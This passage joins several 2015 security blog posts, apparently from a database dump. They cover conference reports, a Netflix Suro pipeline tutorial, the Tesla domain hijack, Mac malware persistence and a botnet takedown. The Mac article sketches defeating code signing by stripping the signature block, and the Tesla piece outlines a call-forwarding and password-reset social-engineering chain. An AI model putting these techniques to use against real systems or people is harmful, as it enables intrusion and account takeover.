the expo floor “overwhelming,” adding that the critical mass of attendees makes attending RSA a must for many in the industry.\n“Networking is a big part of the show,” he said. “It’s a huge networking opportunity, personally and professionally, above all else.”\n“A lot of that takes place outside of the expo floor,” he added.\nOne of key point attendees repeated over and over again was, despite the crush of the expo floor crowds, having the ability to meet with technical professionals in a low-pressure atmosphere was something they found invaluable.\n“Even if the conference was just one day, it would be a successful trip,” Cullison said.', 'Blog;Events', 'https://umbrella.cisco.com/blog/2015/04/29/security-pros-reflect-rsa-conference/');

In an attempt to solve this issue, Netflix has released one of their internal tools as open source that helps centralize incoming application data to be sent to different data technologies.\nSuro is a distributed pipeline that services the moving, aggregating, routing, and storing of data across multiple platforms. Netflix uses Suro for distributing data across their network of databases including numerous AWS EC2 instances and large Hadoop (HDFS) clusters. It is scalable, and the data transferred is highly available utilizing the async/sync communication protocols in the Suro client. The Suro server supports inputs from Thrift and Kafka, and outputs data to its built-in data sinks for the local file system, HDFS, S3, Kafka, and Elasticsearch.\nIn this tutorial, we dive into a basic client/server model of Suro. First, we will create a basic server that simply takes a message sent from the client using Thrift. Upon receiving the message through Thrift, the server then routes it to a local file using the LocalFileSink. Next we add a layer to incorporate sending messages to the ElasticSearchSink. This tutorial is meant to help readers better understand the basic functionalities of Suro and highlight the interesting feature of routing incoming data to multiple sources.\nRequirements:\nUnix programming environment\nJava Runtime Environment (JRE) installed\nBasic knowledge of UNIX terminal commands\ngit installed\nA Java IDE (e.g., IntelliJ, Eclipse)\nA basic Elasticsearch cluster/node setup (download and installation instructions here.)\nPart 1:\nSetting Up the Server:\nWe begin with setting up a basic Suro server.\nClone the Suro GitHub repository\ngit clone https://github.com/Netflix/suro\ncd suro\nMake sure your repository is checked out to branch 0.2.9\ngit branch\nIf not, checkout branch 0.2.9\ngit checkout 0.2.9\nCompile using Gradle commands:\n./gradlew installApp\ncd suro-server\nModify configuration files in the “conf” directory:\nFile: input.json\nDescription: This configuration file specifies the types of inputs Suro server will consume. Currently it only has two options: Thrift and Kafka. A Suro server may have multiple inputs. For this tutorial, we will only look at the Thrift input.\n[\n     {\n     \"type\": \"thrift\"\n     }\n]\nFile: routingmap.json:\nDescription: This configuration file specifies which routing keys point to which sinks. For the first part of the tutorial, we will leave this empty because we will only be using one sink. If a key is not specified in this file,  the routing key will point to the default sink.\n{\n}\nFile: sink.json\nDescription: This configuration file specifies the sinks to which the Suro server will route. We will begin by using a LocalFileSink as our default. The outputDir path specifies where the sent messages will be saved.\n{\n     \"default\": {\n          \"type\": \"local\",\n          \"outputDir\": \"/tmp/suroserver/demo\",\n          \"minPercentFreeDisk\": 10,\n          \"writer\": {\n                  \"type\": \"text\"\n          }\n     }\n}\nSetting Up the Client:\nWe will now create a separate Suro client. This post demonstrates how to do this on IntelliJ, but other Java IDE’s should be similar.\n1. Create a Maven project:\nOpen IntelliJ and create a new project. Select Maven on the sidebar and choose the Java SDK installed on your system. Click Next.\n\n\nNext enter a Groupid and Artifactid. Click Next.\n\nFinally, enter a project name and click Finish.\n\n\n2.  In the generated pom.xml file, add these repositories and dependencies.\n<repositories>\n     <repository>\n          <id>github.release.repo</id>\n          <url>https://raw.github.com/bulldog2011/bulldog-repo/master/repo/releases/</url>\n     </repository>\n</repositories>\n\n<dependencies>\n     <dependency>\n          <groupId>com.leansoft</groupId>\n          <artifactId>bigqueue</artifactId>\n          <version>0.7.0</version>\n     </dependency>\n     <dependency>\n          <groupId>com.netflix.suro</groupId>\n          <artifactId>suro-client</artifactId>\n          <version>0.2.9</version>\n     </dependency>\n     <dependency>\n          <groupId>com.google.guava</groupId>\n          <artifactId>guava</artifactId>\n          <version>18.0</version>\n     </dependency>\n</dependencies>\n3. Create a class named DemoSuroClient in /demo-suro-client/src/main/java:\n\n4. Add the following to DemoSuroClient class to look like this:\nimport java.util.Properties;\nimport com.netflix.suro.ClientConfig;\nimport com.netflix.suro.client.SuroClient;\nimport com.netflix.suro.message.Message;\n\npublic class DemoSuroClient {\n\n     public static void main(String[] args) {\n\n          final Properties clientProperties = new Properties();\n          clientProperties.setProperty(ClientConfig.LB_TYPE, \"static\");\n          clientProperties.setProperty(ClientConfig.LB_SERVER,\n\"localhost:7101\");\n\n          SuroClient client = new SuroClient(clientProperties);\n\n          client.send(new Message(\"routingKey\", \"Test Message\".getBytes()));\n\n          client.shutdown();\n     }\n}\nExplanation:\nThis is our basic Suro client. We create a client using the minimum required properties:\nthe load balancer type\nthe IP address and port number of the Suro server (you can find this information outputted on terminal when you run the server)\nNext we send a message to the Suro server, which includes the routing key and the message payload in bytes.\nRunning/Testing Suro (LocalFileSink):\nTime to run Suro!\nRun Suro Server:\nIn terminal, cd to the /suro/suro-server directory\nEnter:\njava -cp \"build/install/suro-server/lib/*\" com.netflix.suro.SuroServer -m conf/routingmap.json -s conf/sink.json -i conf/input.json\nRun Suro Client:\n\nNOTE: You might see this exception outputted by the server on the terminal:\norg.apache.thrift.transport.TTransportException: java.net.SocketException: Invalid argument\n...\nIgnore this message. It is a known issue. Click here for more info.\nVerify the message was sent to the server:\nGo to http://localhost:7103/surosinkstat\nYou should see:\ndefault:1 msgs, 12 bytes written, 0 have empty routing key. 0 failures of closing files\nStop running the client (Note: you may notice that your client doesn’t shut down. This is a known issue.)\nStop running server\nIn terminal, hit “Ctrl-C”\nVerify messages were received by the LocalFileSink\ncd /tmp/suroserver/demo\ncat *.done (* = arbitrary file name Suro generates for the file)\nYou should see:\nTest Message\nSo far in the tutorial, we managed to create a simple Suro client that can send a string message via Thrift to the Suro server. The server then routes the message to the LocalFileSink. We verified this by checking “suroinkstat” using the web browser interface and checking the physical file in the local directory. Take note that the routing key sent with the message is arbitrary since we only have one sink. Therefore all messages sent with any routing key will be routed to the default sink, that is the LocalFileSink.\nPart 2:\nSetting Up Suro to Use ElasticSearchSink:\nWe will now simulate the big data problem on a smaller scale. The next part of the tutorial adds the ElasticSearchSink layer to demonstrate how Suro is able to route messages to different data storage sources with its built in sinks.\nModify Suro Server configuration files:\nFile: routingmap.json\nDescription: In part 1 this file was empty, but now we need to add a message routing map because we have multiple sinks. We specify that messages with routing key “esKey” will be directed to the sink labeled “esSink.” Any other routing keys will be directed to the default sink.\n{\n     \"esKey\": {\n        \"where\": [\n               {\n               \"sink\": \"esSink\"\n               }\n               ]\n     }\n}\nFile: sink.json\nFirst we will go over the parameters needed for the ElasticSearchSink configurations.\n\nImportant parameters: The above image is what our ElasticSearchSink configurations will look like. Here is a brief summary of the parameters:\n1. Type: specifies the type of sink\n2. Cluster.name: name of Elasticsearch cluster\n3. AddressList: the IP addresses of Elasticsearch nodes to communicate with\n4. IndexInfo: this encapsulates the required information Elasticsearch needs to index the given messages. Elasticsearch assumes messages are in JSON format.\n5. Timestamp (required):\n– specify the timestamp field of your JSON message\n– in this example, the timestamp field is “ts”\n6. IndexTypeMap (required):\n– specifies which index and type to store the message in with the given routing key\n– Field values:\n– esKey: the routing key used to route messages to this sink\n– index: the index name\n– type: the index type\n– for this tutorial, I chose to name the index “index” and type “type”\nOther parameters:\n7. clientName: arbitrary Elasticsearch client name\n8. batchSize, batchTimeout, corePoolSize, maxPoolSize, jobQueueSize, queue4Sink: configurable settings for performance. For more information about these parameters, click here.\nAdding the ElasticSearchSink configuration settings to the sink.json file should look like the code block below. Now we have two sinks: default (LocalFileSink) and esSink (ElasticSearchSink).\n{\n     \"default\": {\n        \"type\": \"local\",\n        \"outputDir\": \"/tmp/suroserver/demo\",\n        \"minPercentFreeDisk\": 10,\n        \"writer\": {\n               \"type\": \"text\"\n        }\n     },\n     \"esSink\": {\n        \"type\": \"elasticsearch\"\n        \"clientName\": \"test-client\",\n        \"addressList\": [\n               \"127.0.0.1:9300\"\n        ],\n        \"indexInfo\": {\n               \"timestamp\": {\n                     \"field\": \"ts\"\n               },\n               \"indexTypeMap\": {\"esKey\":\"index:type\"},\n               \"type\": \"default\"\n        },\n        \"batchSize\": 2500,\n        \"batchTimeout\": 10000,\n        \"cluster.name\": \"elasticsearch\",\n        \"corePoolSize\": 4,\n        \"maxPoolSize\": 4,\n        \"jobQueueSize\": 0,\n        \"queue4Sink\": {\n               \"capacity\": 1000000,\n               \"type\": \"memory\"\n        }\n     }\n}\nModify Suro Client:\nIn DemoSuroClient.java:\nAdd code to send a basic JSON message to the ElasticSearchSink and LocalFileSink\nThe JSON message has two fields:\n\nts: the timestamp field that holds the current time (UTC) in milliseconds\nf1: arbitrary field with arbitrary value “v1”\nimport java.util.Map;\nimport java.util.Properties;\nimport com.netflix.suro.ClientConfig;\nimport com.netflix.suro.client.SuroClient;\nimport com.netflix.suro.message.Message;\nimport com.fasterxml.jackson.core.JsonProcessingException;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.netflix.suro.jackson.DefaultObjectMapper;\nimport com.google.common.collect.ImmutableMap;\npublic class DemoSuroClient {\n\n     public static void main(String[] args) throws JsonProcessingException {\n\n        final Properties clientProperties = new Properties();                        clientProperties.setProperty(ClientConfig.LB_TYPE, \"static\");\n        clientProperties.setProperty(ClientConfig.LB_SERVER,\n\"localhost:7101\");\n        ObjectMapper jsonMapper = new DefaultObjectMapper();\n\n        SuroClient client = new SuroClient(clientProperties);\n\n        Map<String, Object> msg = new ImmutableMap.Builder<String, Object>()\n                             .put(\"ts\", System.currentTimeMillis())\n                             .put(\"f1\", \"v1\")\n                             .build();\n\n        client.send(new Message(\"routingKey\",\njsonMapper.writeValueAsBytes(msg)));\n\n        client.send(new Message(\"esKey\", jsonMapper.writeValueAsBytes(msg)));\n\n        client.shutdown();\n     }\n}\nRunning/Testing Suro (LocalFileSink and ElasticSearchSink)\nRound two!\nMake sure Elasticsearch is running. (If not, follow the Installation steps here.)\nRun Suro Server: cd to the suro/suro-server directory and enter:\njava -cp \"build/install/suro-server/lib/*\" com.netflix.suro.SuroServer -m conf/routingmap.json -s conf/sink.json -i conf/input.json\nRun the Suro Client.\nVerify messages were sent to the server. Go to http://localhost:7103/surosinkstat. You should see:\ndefault:1 msgs, 30 bytes written, 0 have empty routing key. 0 failures of closing files\n\nesSink:indexed: 1, rejected: 0, parsing failed: 0\nStop running client and server.\nVerify messages were received by the LocalFileSink:\ncd /tmp/suroserver/demo\n\n\ncat *.done\n\n*=arbitrary file name Suro generates for this file\nFile should be different than the one outputted in part 1 of the tutorial\n“ts” will be different since it is the current time\nYou should see:\n{\"ts\":1427841866680,\"f1\":\"v1\"}\nVerify messages were received by the ElasticSearchSink (curl ‘localhost:9200/_cat/indices?v’).

The “_id” and “ts” will be different. You should see:\n{\n   \"took\" : 1\n   \"timed_out\" : false,\n   \"_shards\" : {\n      \"total\" : 1,\n      \"successful\" : 1,\n      \"failed\" : 0\n   },\n   \"hits\" : {\n      \"total\" : 1,\n      \"max_score\" : 1.0,\n      \"hits\" : [ {\n      \"_index\" : \"index\",\n      \"_type\" : \"type\",\n      \"_id\": \"AUxyCAKYW6d2U9MFnCYn\",\n      \"_score\" : 1.0,\n      \"_source\":{\"ts\":1427842261844,\"f1\":\"v1\"}\n      } ]\n   }\n}\nWe now have successfully added an ElasticSearchSink to our Suro setup. Taking a look at the above output from Elasticsearch, we can see that the document has index name “index” and type name “type” as specified in our ElasticSearchSink configuration settings. The ID field is auto-generated but can be set to a field in the document (see idFields section on this page). The source field matches the output returned by the LocalFileSink, so we have demonstrated it is possible to take a single input and route that information to multiple data sources.\nConclusion:\n\nAt OpenDNS, we are still experimenting with Suro; trying to find the best way to configure it to fit our needs. So far it looks promising. We believe Suro is capable of providing a scalable solution for routing data across multiple platforms without sacrificing performance. However, documentation of other users’ experiences and simple use-case examples are lacking online. We hope that our tutorial will help others save time trying to figure out how to use Suro and jump right into using it to solve big data needs.

The teslamotors.com website was redirected to a server hosted in Amsterdam. Within a few minutes, the account began sending tweets promising free Tesla cars to those who called a certain phone number, which belonged to a computer repair shop in Illinois, and was presumably tweeted out to flood the number’s owner with calls. Later that same day it was revealed that Tesla founder Elon Musk’s Twitter account was compromised. According to Dave Smith at Business Insider “though the parties claiming responsibility offer up different names, it appears to be one coordinated attack on all of Musk’s online and social properties.”\nLet’s take a deeper dive into what happened.\n1) This was not a “hack,” but a series of related defacements\nWe’d first like to communicate that we believe this to be a compromise, and not necessarily a “hack.” This attack (and we use the term loosely) involved the redirecting of legitimate traffic destined for teslamotors.com to an IP address of the attackers’ choosing.\nVisitors to the domain were presented with the following page (as captured by David Maynor via his Twitter feed):\nOh wow…That can’t be good. #tesla #hacked pic.twitter.com/IjASf2ZCw3\n\n— David Maynor (@Dave_Maynor) April 25, 2015\nAt roughly the same time, the corporate Twitter account for Tesla was compromised. Once controlled by the attackers, several tweets appeared from the @TeslaMotors Twitter account and the name of the account was changed to “#RIPPRGANG.” The account also tweeted the number to call to get a free Tesla. The number was that of a small computer repair shop in Illinois.\n\nElon Musk’s account also began tweeting messages about free cars and where they can be picked up–at the same address in Illinois.\n\n2) The domain registrar may have been socially engineered to give up control of the teslamotors.com domain\nIt appears that very little sophistication was involved in this defacement. As such, there was initial speculation of a social engineering (SE) attack against the domain registrar but sources close to the investigation inform us that the SE attack vector was not exploited.\nA SE attack against the registrar would explain how the attackers were able to gain access to both the corporate Twitter account and the account of founder Elon Musk. By controlling the domain, and by association the MX (mail exchange) records, the attackers could request a password reset for the Twitter accounts.\nBy controlling the MX record, the e-mailed password resets would have given the attacker control of the social account passwords.\nThe official statement from Tesla, as told to Thomas Fox-Brewster of Forbes, was that\n“Posing as a Tesla employee, somebody called AT&T customer support and had them forward calls to an illegitimate phone number. The impostor then contacted the domain registrar company that hosts teslamotors.com, Network Solutions. Using the forwarded number, the imposter added a bogus email address to the Tesla domain admin account. The impostor then reset the password of the domain admin account, routed most of the website traffic to a spoof website and temporarily gained access to Tesla’s and Elon’s Twitter accounts.”\nTesla’s corporate network, cars, and customer database were not affected and everything has been restored to normal, according to the spokesperson.\n“We are working with AT&T, Network Solutions, and federal authorities to further investigate and take all necessary actions to make sure this never happens again,” the spokesperson added.\nSo the domain registrar was not SEd, but rather AT&T. This is not the first time that AT&T was tricked into redirecting calls to an illegitimate phone number.\n3) DNS shows a timeline of changes during the attack\nAs you can see from OpenDNS Investigate results for teslamotors.com, the domain’s IP address was changed on April 25th from 205.234.27.220 to 4 additional IP addresses not owned or controlled by Tesla.\n\nOpenDNS Investigate’s new WHOIS information shows that the domain is back to using UltraDNS for its name servers.\nThe historical (and expected) IP address for teslamotors.com is associated with AS 40913 owned by Quality Technology Services Santa Clara, LLC. This is where the domain is usually hosted.\n\nThe new IP addresses are shared between hosting providers Digital Ocean (AS 200130), VOXILITY (AS 3223), and OVH (AS 16276). As you can see below, at least 2 of the IP addresses have a questionable track record.\n4)  So far, nothing indicates visitors were at risk for malware downloads\nThe teslamotors.com domain received a surge in visits between 04:00 and 07:00 UTC. The most significant spike to the domain occurred on April 26th at 05:00 UTC as shown below.\nThis was likely due to the attackers publicizing the “hack.” The subsequent Internet frenzy to visit the site ensued and was noticed by more than a few individuals.\nThere is no indication of any malware being dropped, nor were visitors redirected to another site to download malware. This can be verified by the HTML dump of the fraudulent site on Pastebin: http://pastebin.com/j6kz0Kdk.\n5) The Islamic State of Iraq and ash-Sham (ISIS) was not likely involved, but Lizard Squad may have been?\nAt one point during the campaign, the teslamotors.com site was redirected to another fear-inspiring domain: isis[.]camp.\nNow http://t.co/Y0Ab1JRkjM points to a domain with ISIS in it. #tesla#hackpic.twitter.com/LHItCZcJbT\n\n— David Maynor (@Dave_Maynor) April 25, 2015\nThe newly created domain was registered at ENom and hosted at DreamHost Web Hosting‎ for a brief time. So was this the work of ISIS? In a word, unlikely. It’s incredibly unlikely that ISIS would have it out for Tesla as a company. It’s even more unlikely that they’d direct their anger at a small Illinois-based computer repair shop. There are speculations around the research community, as well as the targeted individual, that this breach was the work of “Ryan” aka “zeekill” aka “Julius Kivimäki”, a Finish national with alleged ties to Lizard Squad.\nReceiving reports that Julius Kivimaki hacked Tesla and Elon Musk’s Twitter accounts and websites by Social engineering NetworkSolutions\n— r000t (@rootworx) April 26, 2015\nOpenDNS can neither confirm nor deny attribution at this time.\nThe use of Jihadist-inspired defacements is not new. As many of these defacements are meant to drive traffic to the hijacked site, instill fear, and increase publication int he popular media, the use of controversial (yet unrelated) imagery and messaging is becoming common place.\nAs always, please let us know if you have any additional information or would like to talk to us about our findings.', 'Incident Response;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2015/04/27/five-things-to-know-about-the-tesla-motors-compromise/');

To prevent getting caught, malware needs to maintain persistence. And in OS X, it’s incredibly easy.\nMost major antivirus software companies have an offering for virus and malware detection in OS X. Sophos, eSET, Symantec, Bitdefender, and others all offer scanning and detection for Mac. However, Synack, Inc. Director of Research Patrick Wardle displayed at RSA 2015 how he built a practical test to see which malware solutions were up to the task.\nResults were pretty startling. None of them caught his malware. Not one of the major antivirus or anti-malware companies’ solutions alerted to–let alone blocked–its install or the malware’s persistence. The only major provider Wardle did not test was McAfee, he said.\nMalicious persistence is essentially the act of making code, scripts, or apps launch or execute after rebooting, and not getting caught. This is essential to malware, because malware foiled by rebooting would be mostly useless.\nApple’s Built-In Protection\nApple has a number of malware and virus protections written into OS X, which is part of why Macs are typically regarded as safer than Windows machines. But it’s also due to Apple’s marketing and an incorrect mindset. “Apple use to have a slogan on their web sites that said ‘Macs don’t get viruses,’ [which is] not true,” Wardle said. “They just don’t get PC viruses.”\nWithout going into each one of a Mac’s built-in security features in detail, the components in question are: Gatekeeper, Xprotect, OS X (app) Sandbox, and code signing. There are other security features in OS X as well. Mac firewall, Filevault, and Parental Controls are some examples. These protections operate at different levels to prevent attackers or malicious software from doing things they’re not supposed to. Wardle’s research is disconcerting because the exploits found in it affect the most basic levels of OS X.\nApple’s Built-In Fail\nSome of these built-in defenses need merely an OS settings change, recompiling of a kext entry, or a change in an app’s name to allow the malware to install, get root access, and persist despite updates or reboots.\nAs a single example, of the 20 or so scenarios Wardle demonstrated, is getting a malicious app to run but appear legitimate. And in OS X it’s easy. How easy?\n“It’s trivial,” Wardle said.\nApps that run in OS X have a hash that verifies their legitimacy. Apps are signed through the development process using a developer’s key. Unlike in iOS, OS X allows apps that are unsigned to run without blocking them. So how does an attacker compromise an app and make it look legitimate to the OS? Simply remove the signature.\nImage from Virus Bulletin.\nWardle explained how easy it is for attackers to bypass the app signing feature. In fact, the change required is so easy that high school students explained how it works (in Windows) during BSides Huntsville. Just one example method is to remove the signature from what’s called the LC_CODE_SIGNATURE block in a kext file, which essentially turns off the signature verification. Recall the car key analogy. When an attacker can unsign an application like Safari–for example–using this technique, it’s like not even needing a key to start the car’s engine.\n“This is a rather big security issue,” Wardle said in his written report. “As any signed application can be unsigned, then infected with viral code, and [it] will still be allowed to execute.”\nThough most users might say they have never had a virus on a Mac, assuming this is all possible and easy as it seems, the scary part is they might have and would never know it.\nAgain, this was just one of Wardle’s exploit examples. One out of 20 or so others.\nHow to Protect Your Mac\nIf everything Wardle demonstrated is true, and the major antivirus providers do not have an adequate solution to detect simple but dangerous attacks like privilege escalation, software hijacking, rootkit installs, and so one, enterprises with a Mac population should esure they are equipped to monitor network traffic properly. Most malware detection operates primarily by some sort of hash checking or inspection. Like in the methods described earlier, if attackers can change hashes quickly and fairly effortlessly, malware detection scanners likely won’t catch them.\nWardle has written a couple of custom tools to help with this and other OS X security flaws. And this year he debuted a UI for the tool, which originally had to run via a Python script in Terminal. “Knock Knock” and “Block Block” are tools Wardle says can detect when malware is installed or trying to persist in the operating system.\nIf these tools work well, they could be a dire addition to monitoring for and preventing harmful malware changes and attacks. Pairing the two with scrupulous network traffic monitoring and enforcement would yield useful indicators of any odious activity on OS X hosts.\nThough they might not be perfect, proper use of the security precautions that are there–like Gatekeeper, Filevault, the Mac firewall, and File Quarantine–and other tools like Little Snitch couldn’t hurt.\n\nAlso, keep the antivirus. Though most or all solutions are circumventable, they will catch more than not having any at all, even if just barely.', 'Blog;Community;Events;Labs Research;Security 101', 'https://umbrella.cisco.com/blog/2015/04/24/the-empty-os-x-security-toolbox-mac-malware-persistence-is-scary-easy/');

Now imagine having no lights in your house without paying a small fee, or not being able to drive your car, or run your washing machine.\nIf you believe Adi Shamir–and you should–this scenario is not far off. “Today ransomware is effecting your PC, and maybe your phone,” Shamir told a large crowd during the The Cryptographer’s Panel at RSA 2015. “Imagine a world where everything is connected to the Internet, like having your Smart TV ‘ransomewared’ and you have to pay someone in Monrovia to get your TV service back.”\nIt’s a disturbing scenario that the security community is starting to pay more attention to. Gartner estimated in January that by 2020 the world will have 25 billion Internet-connected devices will be in use globally. This figure includes an estimated 250,000 cars with Internet connectivity.\nOne of the scariest components to the Internet of Things (IoT) threat is the helplessness of it all. Deloitte Partner Ifran Saif held a peer discussion during RSA that enumerated many of the concerns about IoT devices. “The reason why it’s so scary is you can’t control it as an individual,” he said. “[But] it’s also a matter of how these devices get deployed. You can have a perfectly safe device, but security won’t work if it’s not properly deployed.”\nOf course the scenarios surrounding IoT security go further than just home consumer products. Imagine, for instance, if the SmartTV scenario at the beginning of this article was instead an X-Ray machine in a hospital. According to Saif, this is already practically a real scenario. “I witnessed a live X-ray machine installed in a hospital that had the [manufacturer’s] default password configured on it,” Saif told the peer group at RSA. “You could just Google it and you’re in.”\nDuring a panel discussion at Georgetown Law last year Palo Alto Networks CSO Rick Howard reinforced the worry. “Ransomware is the future; it’s is going to touch the consumer hard,” he said. “Banks cover credit card fraud.

In 2014 Kaspersky estimated 1,800 unique attacks categorized into 25 different families engineered specifically for Macs. As malware and phishing attacks become targeted, more sophisticated, and easier to carry out, Mac users can no longer rely on hackers not targeting the smaller OS X market share for security. To combat the growing threat, companies will need to use analysis tools that can automate forensics.\nIvan Leichtling, engineering manager at Yelp, laid out the issue simply: “There’s a ton of malware for Macs,” he told a large crowd at BSides SF 2015. “If you haven’t seen it, that’s because it’s on your machine.”\nAt Yelp, a company with 29 global deployments and 5,000 company Macs, security for OS X is more than just a growing priority. That many Macs means thousands of easy entry points for hackers if Yelp’s security engineers and employees are not watching carefully. Understanding the mammoth task at hand, Leichtling and his team developed a tool named OSXCollector for detecting and containing malware in OS X.\nOSXCollector uses readily available and simple to use components like the Python programming language, which works nicely with Objective-C–the language that powers most Mac apps. The tool also links to a series of filters that can query threat intelligence tools like OpenDNS’s Investigate and VirusTotal scores.\n“Filters are really easy to plug in and move between,” he said. “We run one giant chain that runs most all the filters and recommends next steps.” But high-functioning, free tools can come with sacrifices like speed.\nAdmittedly, Leichtling said, the tool can take hours to process, mostly because of the sheer amount of data it crawls through. And with a mixed computing environment, including Windows, Macs, VMs, and mobile devices, the complexity of forensics gets compounded.\nTanium is a company that promises to help address this issue. Co-founder Orion Hindawi describes the platform as a tool that “in 15 seconds, even at the largest scale of enterprises, can see every endpoint.” But the security platform, unlike OSXCollector, is not free and not without its own potential drawbacks. Minor as it might be, Tanium runs an endpoint client, while OSXCollector does not. Depending on a company’s computing environment and its complexity, installing a client across every machine might prove to be a challenge. But if Tanium is as efficient as it claims, the trade off may be well worth it.\nRegardless, the malware issue for OS X and iOS is only going to increase. If Apple’s grip on the enterprise market continues to grow, so will the attacks.

The show’s agenda ranges from workshops on reverse engineering Android apps to talks about media’s perception of the infosec community. On Sunday, a talk about analyzing malicious domains runs alongside “How to Sell Security Without Selling Your Soul,” a discussion of how to attract and retain good people in the industry.\n“BSides is the punk rock event of the security industry,” said Banasidhe, one of the core organizers of BSidesSF and executive producer of BSides Las Vegas. “Volunteers are putting in so much of their own free will and their own heart into the event. No one is doing it for the money. No one is doing it for the fame. It comes from the community, for the community.”\nUnlike big budget conferences like RSA and Blackhat, BSides relies heavily on the infosec community for sponsorship and support. BSides San Francisco will be almost entirely staffed by volunteers, and the BSides Las Vegas is still accepting community donations for its August event.\nWhile two of the biggest events–BSides San Francisco and BSides Las Vegas–are both scheduled so they benefit from the large crowds attending established security conferences like RSA, smaller satellite un-conferences abound. The Security BSides organization bills itself more as a framework for building events for and by members of the information security community. With a roster of more than 60 BSides conferences listed on the main website, BSides counts cities from Algiers to Warsaw as past event locations. According to Banasidhe, the fact that the events have taken place on every continent except for Antarctica shows how much untapped demand there is for access to security education.\n“In the case of Las Vegas and San Francisco, we’re providing alternatives for people who, for example, might be unemployed or students,” said Banasidhe. “It’s an extra couple of days of infosec training in an arena that allows them to learn without breaking the bank. BSides allows them to do with in their own backyards.”\nOpenDNS Security Labs Researcher Kevin Bottomley agrees. “The event is almost free, which is nice. You meet really cool people, and not just those in the information security,” he said. “You could meet people from HR or someone who is interested in learning more about the security industry. It could be an IT guy whose company has gotten phished in the past, and he may want to be more knowledgeable of it and find ways to fight it.”\nBottomley, who is giving his own talk at BSides SF on the evolution of modern phishing campaigns, also points to the different and varied topics at BSides as another reason to attend the conference. “There was some pretty cool physical security stuff at BSides a couple years ago, which is something you don’t see at more mainstream events. At BSides, I always like to check out the Lockpick Village and see how fast I can tear through all of their locks.”\nBut more than just novelty, Bottomley says that the diversity of BSides provides him with a much-needed perspective by showcasing other aspects of the infosec community than the ones he focuses on for his day-to-day work.\n“BSides is good for networking, good for meeting people from other companies,” he said. “It gives me a chance to see what other people are doing, what they’re presenting on. Usually you focus on one narrow aspect of security for most months or years at a time. This is an opportunity to listen to what other people have to say.”\nBSides SF is happening April 19 & 20 in San Francisco.

The difficult effort of stopping the botnet is complete. “Operation Source,” as it’s become known, was a mark of success for collaboration between international law enforcement agencies and private security firms like Intel, Kaspersky, and Shadowserver. But, as we’ve seen before with cases like Kelihos, botnets can resurface after a dormant period.\nWhile the sinkhole operation was a great success, according to OpenDNS security researcher Mark Nunnikhoven, it is only the first step to ensuring security for those affected by the botnet. The next–and perhaps more crucial–steps are to shutdown the servers involved and clean the infected endpoints.\nBeebone–or AAEH as it’s also called–reportedly infected more than 12,000 systems across a number of countries worldwide, though the full scope of infections may not be entirely known. Beebone itself is not a destructive virus, however. It is the delivery mechanism for installing malware like keyloggers, banking trojans, and ransomware onto compromised machines.\nThe interagency sinkhole essentially chops the botnet’s capability at its knees. However, unless they have been thoroughly cleaned, the endpoints compromised by Beebone are still very much infected. The sinkhole merely means outbound traffic intended for what were formerly command and control (C&C) IPs will now get dropped. This result is positive. It means those infected machines will no longer receive instructions from a malicious server–for now.\n“Due to the takedown, these devices are now receiving a benign response, but they still need to be disinfected,” Nunnikhoven wrote in a blog post. “The US-Cert has published links to cleanup tools for various systems that can help with these efforts.”\n\nAnalysis from OpenDNS shows traffic requests to these formerly malicious domains are still at very high levels. “What we’re seeing through our global viewpoint of DNS traffic is requests to the various botnet domains have not dropped significantly since the takedown on April 9th,” Nunnikhoven said. “The continued significant traffic to these domains suggests that cleanup efforts have not been effective yet.”\nUnless infected systems are cleaned, hackers responsible for Beebone can essentially pick up where they left off if they included an IP update mechanism with the malware they used. But the cleanup can be incredibly tricky. The collaborative effort to sinkhole such a massive interconnected system of compromised servers is a huge undertaking. But the effort required to individually clean all the machines infected by the Beebone malware is even larger.\nDhia Mahjoub, senior security researcher at OpenDNS, has spent a great amount of time researching botnets like Kelihos and Zbot, which have similar characteristics to Beebone. And he’s fully aware of the challenges involved with stopping them. “Sinkholes are good for telemetry, which will measure the extent of the threat,” he said. “Step two is for law enforcement to actually take down the involved servers, and to clean the endpoint machines.”\nBut the last part is the most difficult, as it involves finding all the infected machines and somehow communicating to their users that they have been infected and need cleaning.\n“Cleanup is incredibly difficult because the burden lies on the individuals using infected machines, or their ISPs,” Mahjoub said. “It’s a huge effort and very expensive.

This multi-organization effort (see the full list of organizations below) resulted in the domains associated with the botnet being sinkholed. This effort provides a window of time for the infection to be cleaned up before it receives new marching orders.\nYou can read more about the malware associated with this network in the US-CERT post or in the press release from Europol. In this post we’re going to take a deeper look at the infrastructure of this botnet and how it has evolved over time.\nInitial Report\nAfter the press release announcing the takedown, the OpenDNS security research team used the preliminary data to map the known infrastructure and compare it using our unique view of DNS traffic on the internet.\nLooking at the activities of networks that were known to have requested AAEH domains provided some insights to just how widespread this network is. This pattern analysis uncovered new domains that were not initially suspect and expanded the discovered area of the botnet by 7.1 percent.\nAfter sharing the specifics of that discovery with the community, it was time to start looking at how this infrastructure had evolved over time.\nInfrastructure Growth\nOur data showed the first signs of malicious activity on a domain associated with AAEH in early January of 2014. In fact, when the takedown was announced, OpenDNS had already blocked 68.8 percent of the botnet network based on other suspicious indicators.\nIf we take all of the historical data we have on these domains and analyze their behavior, we can to put together a crude picture of the growth of AAEH. We have enough data to reliably map 33% of the domains and provide insight on how the network grew over 446 days (from January 5, 2014 to March 27, 2015).\nThis chart shows what percentage growth the bot net experienced on each of these dates. It is not cumulative.\n\nWhile we don’t have sufficient data to correlate the infection rates, this growth rate may be an indication of active infections. As more systems were infected and started reporting back into the infrastructure, more capacity may have been brought online.\nJob Half Done\nIt’s easy to assume that the threat has dissipated since the infrastructure has been cut off at the knees. Unfortunately, that’s not the case. Here’s a chart of continuing, active requests to the known AAEH domains.\n\nYou can see a significant amount of active requests continuing even after Operation Source’s takedown. These requests are an indication of the number of infected machines still attempting to contact the command and control infrastructure.\nThe data show the raw number of continuing requests and are not a direct correlation to the number of infected devices, as a single device will make multiple requests.\nDue to the takedown, these devices are now receiving a benign response, but they still need to be disinfected. The US-Cert has published links to clean up tools for various systems that can help with these efforts.\nThe clean up should be completed as soon as possible as inevitably the attacker will attempt to rebuild the infrastructure.\nNext Steps\nWhile this botnet doesn’t exhibit any particularly unique qualities, it was quite active, and the successful takedown will reduce its effectiveness significantly.\nMore importantly, the coordinated effort between public and private organizations shows how much of an impact the industry can have when we put aside competitive differences and work together. The success of this operation should hopefully lead to more partnerships like this one, and that is a big win for security.\nOrganizations Involved in Operation Source\nEuropol’s European Cybercrime Centre (EC3)\nThe Joint Cybercrime Action Taskforce 